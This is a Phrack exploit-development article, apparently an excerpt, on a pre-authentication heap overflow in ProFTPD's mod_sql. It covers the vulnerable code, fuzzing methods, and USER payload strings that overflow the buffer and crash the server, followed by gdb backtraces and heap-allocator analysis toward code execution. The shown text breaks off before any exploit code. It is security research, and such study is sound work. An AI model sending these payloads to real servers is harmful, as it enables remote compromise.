@@ -1,0 +1,2628 @@
+                              ==Phrack Inc.==
+
+                Volume 0x0e, Issue 0x43, Phile #0x07 of 0x10
+
+|=-----------------------------------------------------------------------=|
+|=------=[ ProFTPD with mod_sql pre-authentication, remote root  ]=------=|
+|=-------------------------=[ heap overflow ]=---------------------------=|
+|=-----------------------------------------------------------------------=|
+|=-------------------=[ max_packetz@felinemenace.org ]=------------------=|
+|=-----------------------------------------------------------------------=|
+
+--[ Contents
+
+  1 - Introduction 
+
+  2 - The vulnerability
+   2.1 - Tags explained
+   2.2 - Generating overflow strings
+
+  3 - Exploring what we can control
+   3.1 - Automating tasks
+   3.2 - ProFTPD Pool allocator
+   3.3 - Examining backtraces
+    3.3.1 - 11380f2c8ce44d29b93b9bc6308692ae backtrace
+    3.3.2 - 2813d637d735be610a460a75db061f6b backtrace
+    3.3.3 - 3d10e2a054d8124ab4de5b588c592830 backtrace
+    3.3.4 - 844319188798d7742af43d10f6541a61 backtrace 
+    3.3.5 - 914b175392625fe75c2b16dc18bfb250 backtrace
+    3.3.6 - b975726b4537662f3f5ddf377ea26c20 backtrace
+    3.3.7 - ccbbd918ad0dbc7a869184dc2eb9cc50 backtrace
+    3.3.8 - f1bfd5428c97b9d68a4beb6fb8286b70 backtrace
+    3.3.9 - Summary
+   3.4 - Exploitation avenues
+    3.4.1 - Shellcode approach
+    3.4.2 - Data manipulation
+
+  4 - Writing an exploit
+   4.1 - Exploitation via arbitrary pointer return
+   4.2 - Cleanup structure crash
+   4.3 - Potential enhancements
+   4.4 - Last thoughts
+
+  5 - Discussion of hardening techniques against exploitation
+   5.1 - Address Space Layout Randomisation
+   5.2 - Non-executable Memory
+   5.3 - Position Independent Binaries
+   5.4 - Stack Protector
+   5.5 - RelRO
+
+  6 - References
+
+--[ 1 - Introduction 
+
+This paper describes and explores a pre-authentication remote root heap
+overflow in the ProFTPD [1] FTP server. It's not quite a standard overflow,
+due to the how the ProFTPD heap works, and how the bug is exploited via 
+variable substition.
+
+The vulnerability was inadvertently mitigated (from remote root, at least 
+:( ) when the ProFTPD developers fixed a separate vulnerability in mod_sql 
+where you could inject SQL and bypass authentication. That vulnerability 
+that mitigated it is documented in CVE-2009-0542. 
+
+The specific vulnerability we are exploring is an unbounded copy operation 
+in sql_prepare_where(), which has not been fixed yet.
+
+Also, I'd like to preemptively apologise for the attached code. It evolved 
+over time in piecemeal fashion, and isn't overly pretty/readable by now :p
+
+--[ 2 - The vulnerability
+
+The vulnerability itself is a little contrived, but bare with me:
+
+In contrib/mod_sql.c, _sql_getpasswd(), we have the following code (line 
+numbers from ProFTPD 1.3.2rc2):
+
+---
+1132   if (!cmap.usercustom) {
+1133     where = sql_prepare_where(0, cmd, 2, usrwhere, cmap.userwhere, 
+                                   NULL);
+1134
+1135     mr = _sql_dispatch(_sql_make_cmd(cmd->tmp_pool, 5, "default",
+1136       cmap.usrtable, cmap.usrfields, where, "1"), "sql_select");
+1137
+---
+
+Where usrwhere is in the form of:
+
+(<table name for user column> = 'USERNAME')
+
+Inside of sql_prepare_where() is where all the fun takes place:
+
+---
+770 static char *sql_prepare_where(int flags, cmd_rec *cmd, int cnt, ...) {
+771   int i, flag, nclauses = 0;
+772   int curr_avail;
+773   char *buf = "", *res;
+774   va_list dummy;
+775
+776   res = pcalloc(cmd->tmp_pool, SQL_MAX_STMT_LEN);                   [1]
+777
+778   flag = 0;
+779   va_start(dummy, cnt);
+780   for (i = 0; i < cnt; i++) {
+781     char *clause = va_arg(dummy, char *);
+782     if (clause != NULL &&
+783         *clause != '\0') {
+784       nclauses++;
+785
+786       if (flag++)
+787         buf = pstrcat(cmd->tmp_pool, buf, " AND ", NULL);
+788       buf = pstrcat(cmd->tmp_pool, buf, "(", clause, ")", NULL);
+789     }
+790   }
+791   va_end(dummy);
+792
+793   if (nclauses == 0)
+794     return NULL;
+795
+796   if (!(flags & SQL_PREPARE_WHERE_FL_NO_TAGS)) {                    [2]
+797     char *curr, *tmp;
+798
+799     /* Process variables in WHERE clauses, except any "%{num}" 
+    references. */
+800     curr = res;
+801     curr_avail = SQL_MAX_STMT_LEN;
+802
+803     for (tmp = buf; *tmp; ) {
+804       char *str;
+805       modret_t *mr;
+806
+807       if (*tmp == '%') {
+808         char *tag = NULL;
+809
+810         if (*(++tmp) == '{') {
+811           char *query;
+812
+813           if (*tmp != '\0')
+814             query = ++tmp;
+815
+816           while (*tmp && *tmp != '}')
+817             tmp++;
+818
+819           tag = pstrndup(cmd->tmp_pool, query, (tmp - query));        
+820           if (tag) {
+821             str = resolve_long_tag(cmd, tag);                       [3]
+822             if (!str)
+823               str = pstrdup(cmd->tmp_pool, "");
+824
+825             mr = _sql_dispatch(_sql_make_cmd(cmd->tmp_pool, 2, 
+           "default",
+826               str), "sql_escapestring");
+827             if (check_response(mr) < 0)
+828               return NULL;
+829
+830             sstrcat(curr, mr->data, curr_avail);
+831             curr += strlen(mr->data);
+832             curr_avail -= strlen(mr->data);
+833
+834             if (*tmp != '\0')
+835               tmp++;
+836
+837           } else {
+838             return NULL;
+839           }
+840
+841         } else {
+842           str = resolve_short_tag(cmd, *tmp);                       [4]
+843           mr = _sql_dispatch(_sql_make_cmd(cmd->tmp_pool, 2,"default",
+844             str), "sql_escapestring");
+845           if (check_response(mr) < 0)
+846             return NULL;
+847
+848           sstrcat(curr, mr->data, curr_avail);
+849           curr += strlen(mr->data);
+850           curr_avail -= strlen(mr->data);
+851
+852           if (*tmp != '\0')
+853             tmp++;
+854         }
+855
+856       } else {                                                      [5]
+857         *curr++ = *tmp++;
+858         curr_avail--;
+859       }
+860     }
+861     *curr++ = '\0';
+862
+863   } else {
+864     res = buf;
+865   }
+866
+867   return res;
+868 }
+869
+---
+
+At [1], memory is allocated. SQL_MAX_STMT_LEN is defined as 4096 bytes. 
+That should be plenty for <300 bytes, right?
+
+At [2], flags are checked to see if "tags" should be expanded. In the case 
+we are interested in, tags are expanded.
+
+At [3], we see that "long tags" are expandable, and that they are 
+surrounded by %{ and finished with }. We'll ignore them for now. They take 
+up too much input space in regards to the output length.
+
+At [4], we see that they have concepts of "short" tags, consisting of one 
+byte.
+
+At [5], we see that they have an unbounded one byte copy operation, inside 
+of a suitable loop.
+
+Now, we need to cover tags to see what we can do with it:
+
+------[ 2.1 Tags explained
+
+For the path we're interested in, we'll cover "short" tags (longer tags are
+not all interesting, and for reasons explained later on).
+
+Looking at resolve_short_tag(), we see the following (heavily snipped for 
+brevity):
+
+---
+1719 static char *resolve_short_tag(cmd_rec *cmd, char tag) {
+1720   char arg[256] = {'\0'}, *argp;
+1721
+1722   switch (tag) {
+1723   case 'A': {
+1724       char *pass;
+1725
+1726       argp = arg;
+1727       pass = get_param_ptr(main_server->conf, C_PASS, FALSE);
+1728       if (!pass)
+1729         pass = "UNKNOWN";
+1730
+1731       sstrncpy(argp, pass, sizeof(arg));
+1732     }
+1733     break;
+1734
+1735   case 'a':
+1736     argp = arg;
+1737     sstrncpy(argp, 
+           pr_netaddr_get_ipstr(pr_netaddr_get_sess_remote_addr()),
+1738       sizeof(arg));
+1739     break;
+1740
+...
+1914   case 'm':
+1915     argp = arg;
+1916     sstrncpy(argp, cmd->argv[0], sizeof(arg));
+1917     break;
+1918
+...
+1929   case 'r':
+1930     argp = arg;
+1931     if (strcmp(cmd->argv[0], C_PASS) == 0 &&
+1932         session.hide_password)
+1933       sstrncpy(argp, C_PASS " (hidden)", sizeof(arg));
+1934
+1935     else
+1936       sstrncpy(argp, get_full_cmd(cmd), sizeof(arg));
+1937     break;
+1938
+...
+1954   case 'T':
+1955     argp = arg;
+1956     if (session.xfer.p) {
+...
+1974     } else
+1975       sstrncpy(argp, "0.0", sizeof(arg));
+1976
+1977     break;
+...
+2021
+2022   default:
+2023     argp = "{UNKNOWN TAG}";
+2024     break;
+2025   }
+2026
+2027   return pstrdup(cmd->tmp_pool, argp);
+2028 }
+2029
+---
+
+So, as you can see, tags are a form of variable substitution. %m and %r 
+allow us to "duplicate" our input, %a allows us to copy our IP address, %T 
+gives us 0.0 (since we're not transferring anything at the moment, and %Z 
+(handled by the default case) gives us "{UNKNOWN TAG}".
+
+By combining these, we can generate strings that expand past the allocated 
+size in sql_prepare_where, due to the unbounded copy.
+
+Firstly, we'll look at what those inputs would generate, then we'll look at
+how to generate suitable overflow strings.
+
+Firstly, the string "AAA%m" once processed would come out looking like:
+
+AAAAAA%m
+
+The string "AAA%m%m" would look like:
+
+AAAAAA%mAAA%m
+
+Unfortunately the string to be expanded isn't as clean as that, it's:
+
+(<name of user entry in table> = 'USER INPUT')\x00
+
+The default of the table field is "userid". Due to the ')\x00 at the end, 
+we can't do arbitrary off-by-1 or 2 overwrites. It's possible that \x00 or
+\x29 could be useful, in some situations however.
+
+Enough chars / %m's etc would expand past 4096 bytes, and start overwriting
+other information stored on the heap. Tags enable exploitation of this 
+issue via it's input duplication. They also have a significant effect on 
+the heap, for better or worse.
+
+(As a side note, contrib/mod_rewrite.c has %m tag support as well. Since it
+seems a little unlikely to hit that pre-auth, it wasn't investigated 
+further..)
+
+------[ 2.2 Generating overflow strings
+
+One initial complication we had in exploring this vulnerability further was
+due to making an overflow string that once processed would expand to a 
+suitable size. (As an example, overflow our own arbitrary content 32 bytes 
+past 4096).
+
+We solved this problem with using a constraint solver to generate the 
+appropriate strings for us, thus solving an otherwise annoying situation 
+(it being a little messy to calculate how much we need, since touching one 
+thing can dramatically throw off the rest of the calculations, as an 
+example, removing one A character would reduce it by one + 
+(one * amount_of_%m_tags)).
+
+In exploring the vulnerability, we used python-constraint [2].
+
+We used several constraints:
+
+  - Input string must be less than 256 bytes.
+  - The parsed string must overflow by exactly X+2 (due to ') added to
+    the end bytes.
+  - One/two others that I've forgotten about as I write this up.
+
+We split the strings into "fakeauth" strings, and "trigger" strings. The
+fakeauth strings are designed to consume/allocate a certain amount of 
+memory, and the trigger strings are designed to overwrite a bunch of bytes 
+after the allocation.
+
+Fakeauth strings seem to be required for maximum control of the remote 
+process, but it's possible it's not required at all.
+
+By mixing the %m's / %a's / %Z's up, it is possible to change memory 
+allocation / deallocation order, and thus explore/affect where it crashes.
+
+While the %a tags are useful in experimenting, they are not ideal, as you 
+then need to take your local IP address into account when exploiting remote
+hosts. 
+
+--[ 3 - Exploring what we can control
+
+------[ 3.1 - Automating tasks
+
+I'm a big fan of automating as much stuff as possible. In order to get a 
+ten thousand foot view of what I can do, I used python-ptrace [3] and
+pyevolve [4] to:
+
+  - Generate input strings
+  - Debug proftpd and record before/after overwriting the memory allocated 
+    in sql_prepare_where
+  - Analyze how "interesting" the results of input strings where.
+    - Process exited? Completely uninteresting. 
+    - SEGV'd? 
+      - Gather backtraces / register contents / see if the program crashed 
+        with our directly controllable user input / etc.
+
+Pyevolve, for the most part, was useful for mutating the input strings to 
+explore the code paths leading to crashes..
+
+By doing these tasks, I was able to find the more interesting paths that 
+could easily be hit, while I was flicking over the ProFTPD pool allocator
+... 
+
+------[ 3.2 - ProFTPD Pool allocator
+
+A high level overview for the ProFTPD pool allocator (src/pool.c) is given 
+at [5], but here are the quick nuts and bolts of it:
+
+- Pools are allocated, and is subdivided into blocks.
+
+- Pools have cleanup handlers (very useful - used in proftpd-not-pro-enough
+  [6] exploit by solar to gain code execution).
+
+- More blocks are malloc()'d if the pool is out of space.
+
+- Memory is never free()'d unless developer mode is enabled, and that's
+  only at daemon shut down. 
+
+- In order to allocate memory, the single linked list of free blocks is
+  checked to see if the allocation request can be satisfied first without 
+  calling malloc().
+
+The pool structure is defined as:
+
+---
+196 struct pool {
+197   union block_hdr *first;
+198   union block_hdr *last;
+199   struct cleanup *cleanups;
+200   struct pool *sub_pools;
+201   struct pool *sub_next;
+202   struct pool *sub_prev;
+203   struct pool *parent;
+204   char *free_first_avail;
+205   const char *tag;
+206 };
+---
+
+The cleanup structure looks like:
+
+---
+655 typedef struct cleanup {
+656   void *data;
+657   void (*plain_cleanup_cb)(void *);
+658   void (*child_cleanup_cb)(void *);
+659   struct cleanup *next;
+660 } cleanup_t;
+---
+
+Overwriting a cleanup structure, or a pool structure, would allow us to
+arbitrarily execute code when the pool is cleared/destroyed.
+
+The block structure is defined as:
+
+---
+46 union block_hdr {
+47   union align a;
+48
+49   /* Padding */
+50 #if defined(_LP64) || defined(__LP64__)
+51   char pad[32];
+52 #endif
+53
+54   /* Actual header */
+55   struct {
+56     char *endp;
+57     union block_hdr *next;
+58     char *first_avail;
+59   } h;
+60 };
+---
+
+Now, we trace pcalloc() as it's called in sql_prepare_where() (and
+numerously throughout the ProFTPD code), just to see what situations will 
+allow us to return pointers that we control. Controlling these returned 
+pointers would allow us to overwrite arbitrary memory, hopefully with 
+content that we can control.
+
+---
+481 void *pcalloc(struct pool *p, int sz) {
+482   void *res = palloc(p, sz);
+483   memset(res, '\0', sz);
+484   return res;
+485 }
+---
+
+gives us:
+
+---
+473 void *palloc(struct pool *p, int sz) {
+474   return alloc_pool(p, sz, FALSE);
+475 }
+---
+
+which in turn gives us:
+
+---
+435 static void *alloc_pool(struct pool *p, int reqsz, int exact) {
+436
+437   /* Round up requested size to an even number of aligned units */
+438   int nclicks = 1 + ((reqsz - 1) / CLICK_SZ);
+439   int sz = nclicks * CLICK_SZ;
+440
+441   /* For performance, see if space is available in the most recently
+442    * allocated block.
+443    */
+444
+445   union block_hdr *blok = p->last;
+446   char *first_avail = blok->h.first_avail;
+447   char *new_first_avail;
+448
+449   if (reqsz <= 0)
+450     return NULL;
+451
+452   new_first_avail = first_avail + sz;
+453
+454   if (new_first_avail <= blok->h.endp) {                        [1]
+455     blok->h.first_avail = new_first_avail;
+456     return (void *) first_avail;
+457   }
+458
+459   /* Need a new one that's big enough */
+460   pr_alarms_block();
+461
+462   blok = new_block(sz, exact);                                  [2]
+463   p->last->h.next = blok;
+464   p->last = blok;
+465
+466   first_avail = blok->h.first_avail;                            [3]
+467   blok->h.first_avail += sz;
+468
+469   pr_alarms_unblock();
+470   return (void *) first_avail;
+471 }
+---
+
+The check at [1] checks to see if the request can be satisfied from the 
+pool allocation itself..
+
+The call at [2] requests a "new_block" of memory. The returned pointer is 
+determined at [3], indicating that the first_avail pointer at least needs 
+to be modified.
+
+---
+151 /* Get a new block, from the free list if possible, otherwise malloc a 
+       new
+152  * one.  minsz is the requested size of the block to be allocated.
+153  * If exact is TRUE, then minsz is the exact size of the allocated 
+       block;
+154  * otherwise, the allocated size will be rounded up from minsz to the 
+       nearest
+155  * multiple of BLOCK_MINFREE.
+156  *
+157  * Important: BLOCK ALARMS BEFORE CALLING
+158  */
+159
+160 static union block_hdr *new_block(int minsz, int exact) {
+161   union block_hdr **lastptr = &block_freelist;
+162   union block_hdr *blok = block_freelist;
+163
+164   if (!exact) {
+165     minsz = 1 + ((minsz - 1) / BLOCK_MINFREE);
+166     minsz *= BLOCK_MINFREE;
+167   }
+168
+169   /* Check if we have anything of the requested size on our free list 
+         first...
+170    */
+171   while (blok) {
+172     if (minsz <= blok->h.endp - blok->h.first_avail) {
+173       *lastptr = blok->h.next;
+174       blok->h.next = NULL;
+175
+176       stat_freehit++;
+177       return blok;
+178
+179     } else {
+180       lastptr = &blok->h.next;
+181       blok = blok->h.next;
+182     }
+183   }
+184
+185   /* Nope...damn.  Have to malloc() a new one. */
+186   stat_malloc++;
+187   return malloc_block(minsz);
+188 }
+---
+
+BLOCK_MINFREE is defined to PR_TUNABLE_NEW_POOL_SIZE, which is defined to 
+512 bytes. 
+
+So, we can see that if we can get the stars to align correctly, we can gain
+code execution via:
+
+  - Pool cleanup/destruction
+  - Corrupting the first_avail pointer in a block.
+
+The second method is a little more effort, but it may not be possible to 
+hit the first.
+
+There are other avenues potentially available such as unlink() style
+corruption, or other heap content overwrites, but they were not explored in
+depth. 
+
+------[ 3.3 - Examining backtraces
+
+After leaving the proftpd input fuzzing / automated crash analysis code [7] 
+running for a while, I decided to stop it and examine some of the 
+backtraces it created, in order to see what was found, and if any indicated
+that they where able to gain direct code execution, or useful memory 
+corruption.
+
+# echo backtraces: `ls -l backtrace.* | wc -l` ; echo unique backtraces:
+  `md5su m backtrace.* | awk '{ print $1 }' | sort | uniq`
+backtraces: 4280
+unique backtraces: 11380f2c8ce44d29b93b9bc6308692ae
+2813d637d735be610a460a75db061f6b 3d10e2a054d8124ab4de5b588c592830
+844319188798d7742af43d10f6541a61 914b175392625fe75c2b16dc18bfb250
+b975726b4537662f3f5ddf377ea26c20 ccbbd918ad0dbc7a869184dc2eb9cc50
+f1bfd5428c97b9d68a4beb6fb8286b70
+
+Some of these back traces are very similiar, only real change in where they
+are called from. However, seeing that the code can be reached from multiple
+places is good; as it gives us more chances to take control of the remote
+process.
+
+Flicking through the backtraces:
+
+--------[ 3.3.1 - 11380f2c8ce44d29b93b9bc6308692ae backtrace ]
+
+# cat bt_frames.99861.0
+EIP: 0xb7b7e67a, EBP: 0xbfd0a0a8, memset
+EIP: 0x08055034, EBP: 0xbfd0a0d8, pstrcat
+EIP: 0x080c0d85, EBP: 0xbfd0a118, cmd_select
+EIP: 0x080c26f2, EBP: 0xbfd0a148, _sql_dispatch
+EIP: 0x080c4354, EBP: 0xbfd0a1f8, _sql_getpasswd
+EIP: 0x080c514d, EBP: 0xbfd0a2d8, _sql_getgroups
+EIP: 0x080ca70e, EBP: 0xbfd0a308, cmd_getgroups
+EIP: 0x080718a6, EBP: 0xbfd0a328, call_module
+EIP: 0x0807339e, EBP: 0xbfd0a358, dispatch_auth
+EIP: 0x0807481d, EBP: 0xbfd0a408, pr_auth_getgroups
+EIP: 0x08074a98, EBP: 0xbfd0a438, auth_anonymous_group
+EIP: 0x08074ea7, EBP: 0xbfd0a478, pr_auth_get_anon_config
+EIP: 0x080a4b5c, EBP: 0xbfd0a4d8, auth_user
+EIP: 0x080718a6, EBP: 0xbfd0a4f8, call_module
+EIP: 0x0804c651, EBP: 0xbfd0a5a8, _dispatch
+EIP: 0x0804caba, EBP: 0xbfd0a5d8, pr_cmd_dispatch
+EIP: 0x0804d4ee, EBP: 0xbfd0aa48, cmd_loop
+EIP: 0x0804ea36, EBP: 0xbfd0ab88, fork_server
+EIP: 0x0804f1cf, EBP: 0xbfd0acf8, daemon_loop
+EIP: 0x080522c6, EBP: 0xbfd0ad28, standalone_main
+EIP: 0x08053109, EBP: 0xbfd0aea8, main
+EIP: 0xb7b1c685, EBP: 0xbfd0af18, __libc_start_main
+EIP: 0x0804b841, EBP: 0x00000000, _start
+
+# cat regs.99861.0
+EAX: 0x00000000
+EBX: 0x0882d654
+ECX: 0x0000103c
+EDX: 0x00000001
+ESI: 0x080d4960
+EDI: 0x41346141
+EBP: 0xbfd0a0a8
+ESP: 0xbfd0a078
+EIP: 0xb7b7e67a
+
+So far, we can see we are memset()'ing a controllable pointer :D
+
+Looking further at _sql_getpasswd in the backtrace:
+
+(gdb) l *0x080c4354
+0x80c4354 is in _sql_getpasswd (mod_sql.c:1252).
+1247      }
+1248
+1249      if (!cmap.usercustom) {
+1250        where = sql_prepare_where(0, cmd, 2, usrwhere, cmap.userwhere, 
+                                      NULL);
+1251
+1252        mr = _sql_dispatch(_sql_make_cmd(cmd->tmp_pool, 5, "default",
+1253          cmap.usrtable, cmap.usrfields, where, "1"), "sql_select");
+1254
+1255        if (check_response(mr) < 0)
+1256          return NULL;
+
+(gdb) l *0x080c0d85
+0x80c0d85 is in cmd_select (mod_sql_mysql.c:812).
+807       } else {
+808         query = pstrcat(cmd->tmp_pool, cmd->argv[2], " FROM ", 
+                            cmd->argv[1], NULL);
+809
+810         if (cmd->argc > 3 &&
+811             cmd->argv[3])
+812           query = pstrcat(cmd->tmp_pool, query, " WHERE ", 
+                              cmd->argv[3], NULL);
+813
+814         if (cmd->argc > 4 &&
+815             cmd->argv[4])
+816           query = pstrcat(cmd->tmp_pool, query, " LIMIT ", 
+                              cmd->argv[4], NULL);
+
+This backtrace is interesting, as it's appending contents we directly 
+control to the chunk. Playing further:
+
+# telnet 127.0.0.1 21
+Trying 127.0.0.1...
+Connected to 127.0.0.1.
+Escape character is '^]'.
+220 ProFTPD 1.3.1 Server (ProFTPD Default Installation) [127.0.0.1]
+USER A%m%m%mA%m%Z%Z%m%m%m%m%Z%mA%m%m%m%mA%m%m%m%m%m%m%m%mA%mA%m%Z%Z%mAA%m%m
+%ZA%m%m%m%ZA%m%m%m%Z%m%m%Z%m
+331 Password required for A%m%m%mA%m%Z%Z%m%m%m%m%Z%mA%m%m%m%mA%m%m%m%m%m%m%
+m%mA%mA%m%Z%Z%mAA%m%m%ZA%m%m%m%ZA%m%m%m%Z%m%m%Z%m
+USER AAAAAAAAAA%m%m%mA%m%m%mA%m%mAA%m%m%m%m%mA%m%Z%m%mA%m%mAA%mA%ZAA%m%m%m%
+m%m%mA%m%ZAAA%mAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9
+Ac0A
+
+...
+
+Program received signal SIGSEGV, Segmentation fault.
+[Switching to Thread 0xb7c7a6b0 (LWP 19840)]
+0xb7cf467a in memset () from /lib/tls/i686/cmov/libc.so.6
+(gdb) bt
+#0  0xb7cf467a in memset () from /lib/tls/i686/cmov/libc.so.6
+#1  0x08054d1a in pcalloc (p=0x98a84c4, sz=4156) at pool.c:481
+#2  0x08055034 in pstrcat (p=0x98a84c4) at pool.c:580
+#3  0x080c0d85 in cmd_select (cmd=0x98a84ec) at mod_sql_mysql.c:812
+#4  0x080c26f2 in _sql_dispatch (cmd=0x98a84ec, cmdname=0x80e4a3d 
+    "sql_select") at mod_sql.c:393
+#5  0x080c4354 in _sql_getpasswd (cmd=0x98a1ad4, p=0xbfa8368c) at 
+    mod_sql.c:1252
+#6  0x080c514d in _sql_getgroups (cmd=0x98a1ad4) at mod_sql.c:1599
+#7  0x080ca70e in cmd_getgroups (cmd=0x98a1ad4) at mod_sql.c:3612
+#8  0x080718a6 in call_module (m=0x80ee940, func=0x80ca6bd <cmd_getgroups>,
+    cmd=0x98a1ad4) at modules.c:439
+#9  0x0807339e in dispatch_auth (cmd=0x98a1ad4, match=0x80d9685 
+    "getgroups", m=0x0) at auth.c:89
+#10 0x0807481d in pr_auth_getgroups (p=0x98a1a04,
+    name=0x9852eec "AAAAAAAAAA%m%m%mA%m%m%mA%m%mAA%m%m%m%m%mA%m%Z%m%mA%m%mA
+    A%mA%ZAA%m%m%m%m%m%mA%m%ZAAA%mAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab
+    3Ab4Ab5Ab6Ab7Ab8Ab9Ac0A", group_ids=0x80fb0bc, group_names=0x80fb0c0) 
+    at auth.c:691
+#11 0x08074a98 in auth_anonymous_group (p=0x98a1a04,
+    user=0x9852eec "AAAAAAAAAA%m%m%mA%m%m%mA%m%mAA%m%m%m%m%mA%m%Z%m%mA%m%mA
+    A%mA%ZAA%m%m%m%m%m%mA%m%ZAAA%mAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab
+    3Ab4Ab5Ab6Ab7Ab8Ab9Ac0A") at auth.c:751
+#12 0x08074ea7 in pr_auth_get_anon_config (p=0x98a1a04, 
+    login_name=0xbfa838f8, user_name=0x0, anon_name=0x0) at auth.c:864
+#13 0x080a4b5c in auth_user (cmd=0x9852e94) at mod_auth.c:1831
+#14 0x080718a6 in call_module (m=0x80ec9e0, func=0x80a4a10 <auth_user>, 
+    cmd=0x9852e94) at modules.c:439
+#15 0x0804c651 in _dispatch (cmd=0x9852e94, cmd_type=2, validate=1, 
+    match=0x9852ee4 "USER") at main.c:424
+#16 0x0804caba in pr_cmd_dispatch (cmd=0x9852e94) at main.c:523
+#17 0x0804d4ee in cmd_loop (server=0x9853af4, c=0x988abdc) at main.c:750
+#18 0x0804ea36 in fork_server (fd=1, l=0x988a7bc, nofork=0 '\0') at 
+    main.c:1257
+#19 0x0804f1cf in daemon_loop () at main.c:1464
+#20 0x080522c6 in standalone_main () at main.c:2294
+#21 0x08053109 in main (argc=4, argv=0xbfa84374, envp=0xbfa84388) at 
+    main.c:2878
+(gdb) i r
+eax            0x0      0
+ecx            0x103c   4156
+edx            0x1      1
+ebx            0x98a2444        160048196
+esp            0xbfa834a8       0xbfa834a8
+ebp            0xbfa834d8       0xbfa834d8
+esi            0x80d4960        135088480
+edi            0x41346141       1093951809
+...
+# ruby pattern_offset.rb 0x41346141
+12
+...
+(gdb) frame 2
+#2  0x08055034 in pstrcat (p=0x98a84c4) at pool.c:580
+580       res = (char *) pcalloc(p, len + 1);
+(gdb) info locals
+argp = 0x0
+res = 0x0
+len = 4155
+dummy = 0xbfa83524 ...
+(gdb) x/32x $esp
+0xbfa834e0:     0x098a84c4      0x0000103c      0x00000000      0x00000000
+0xbfa834f0:     0x00000000      0x0988b62c      0xbfa83524      0x0000103b
+0xbfa83500:     0x00000000      0x00000000      0xbfa83548      0x080c0d85
+0xbfa83510:     0x098a84c4      0x098a854c      0x080e40e5      0x098aa7d4
+0xbfa83520:     0x00000000      0x080ef060      0x00000000      0x00000000
+0xbfa83530:     0x00000000      0x098a854c      0x00000000      0x098a8534
+0xbfa83540:     0x0988b62c      0x0988b68c      0xbfa83578      0x080c26f2
+0xbfa83550:     0x098a84ec      0x080e441a      0x098aa7d4      0x098a3874
+(gdb) x/s  0x098a854c
+0x98a854c:       "userid, passwd, uid, gid, homedir, shell FROM ftpuser"
+(gdb) x/s  0x080e40e5
+0x80e40e5:       " WHERE "
+(gdb) x/s  0x098aa7d4
+0x98aa7d4:       "(userid='", 'A' <repeats 20 times>, "%m%m%mA%m%m%mA%m%mAA
+%m%m%m%m%mA%m%Z%m%mA%m%mAA%mA%ZAA%m%m%m%m%m%mA%m%ZAAA%mAa0Aa1Aa2Aa3Aa4Aa5Aa
+6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0", 'A' <repeats 11 times>, 
+"%m%m%mA%m%m%mA%m%mAA%m"...
+
+This crash is excellent, but it has several drawbacks:
+  - No direct control of EIP, thus requiring overwriting larger chunks of 
+    memory which may be problematic.
+  - Configuration dependent :(
+    - Both SQLUserInfo and SQLGroupInfo specify table names and table 
+      entries. For example:
+      - SQLUserInfo ftpuser userid passwd uid gid homedir shell
+      - SQLGroupInfo ftpgroup groupname gid members
+    - We could collect common configurations recommended in guides so that 
+      we can take them into account when bruteforcing.. sucky though.
+
+Let's see what the others contain before getting too excited :)
+
+------[ 3.3.2 - 2813d637d735be610a460a75db061f6b backtrace ]
+
+# cat bt_frames.16259.0
+EIP: 0x08054b7d, EBP: 0xbfd0a1d8, destroy_pool
+EIP: 0x08054b0c, EBP: 0xbfd0a1e8, clear_pool
+EIP: 0x08054bd1, EBP: 0xbfd0a1f8, destroy_pool
+EIP: 0x0807389f, EBP: 0xbfd0a248, pr_auth_getpwnam
+EIP: 0x080a0e3a, EBP: 0xbfd0a488, setup_env
+EIP: 0x080a51ca, EBP: 0xbfd0a4d8, auth_pass
+EIP: 0x080718a6, EBP: 0xbfd0a4f8, call_module
+EIP: 0x0804c651, EBP: 0xbfd0a5a8, _dispatch
+EIP: 0x0804caba, EBP: 0xbfd0a5d8, pr_cmd_dispatch
+EIP: 0x0804d4ee, EBP: 0xbfd0aa48, cmd_loop
+EIP: 0x0804ea36, EBP: 0xbfd0ab88, fork_server
+EIP: 0x0804f1cf, EBP: 0xbfd0acf8, daemon_loop
+EIP: 0x080522c6, EBP: 0xbfd0ad28, standalone_main
+EIP: 0x08053109, EBP: 0xbfd0aea8, main
+EIP: 0xb7b1c685, EBP: 0xbfd0af18, __libc_start_main
+EIP: 0x0804b841, EBP: 0x00000000, _start
+# cat regs.16259.0
+EAX: 0x62413362
+EBX: 0x0000b25d
+ECX: 0x00000002
+EDX: 0x0882f8e8
+ESI: 0x080d4960
+EDI: 0x088161e8
+EBP: 0xbfd0a1d8
+ESP: 0xbfd0a1d0
+EIP: 0x08054b7d
+
+EAX looks like a modified pointer, and we can see we're in the
+destroy_pool / clean_pool code. No arbitrary EIP yet :~(
+
+(gdb) l *0x08054b7d
+0x8054b7d is in destroy_pool (pool.c:415).
+410         return;
+411
+412       pr_alarms_block();
+413
+414       if (p->parent) {
+415         if (p->parent->sub_pools == p)
+416           p->parent->sub_pools = p->sub_next;
+417
+418         if (p->sub_prev)
+419           p->sub_prev->sub_next = p->sub_next;
+
+(gdb) l * 0x08054b0c
+0x8054b0c is in clear_pool (pool.c:395).
+390       /* Run through any cleanups. */
+391       run_cleanups(p->cleanups);
+392       p->cleanups = NULL;
+393
+394       /* Destroy subpools. */
+395       while (p->sub_pools)
+396         destroy_pool(p->sub_pools);
+397       p->sub_pools = NULL;
+398
+399       free_blocks(p->first->h.next);
+
+So, we can see that we've corrupted the p->parent->sub_pools pointer. Not 
+immediately interesting, as we've isolated what appears to be very 
+interesting earlier on. Might be able to do some fun and games at some 
+point with the old unlink() style, though.
+
+------[ 3.3.3 - 3d10e2a054d8124ab4de5b588c592830 backtrace ]
+
+# cat bt_frames.99758.0
+
+EIP: 0x08054b7d, EBP: 0xbfd0a338, destroy_pool
+EIP: 0x08054b0c, EBP: 0xbfd0a348, clear_pool
+EIP: 0x08054bd1, EBP: 0xbfd0a358, destroy_pool
+EIP: 0x08074a37, EBP: 0xbfd0a408, pr_auth_getgroups
+EIP: 0x08074a98, EBP: 0xbfd0a438, auth_anonymous_group
+EIP: 0x08074ea7, EBP: 0xbfd0a478, pr_auth_get_anon_config
+EIP: 0x080a4b5c, EBP: 0xbfd0a4d8, auth_user
+EIP: 0x080718a6, EBP: 0xbfd0a4f8, call_module
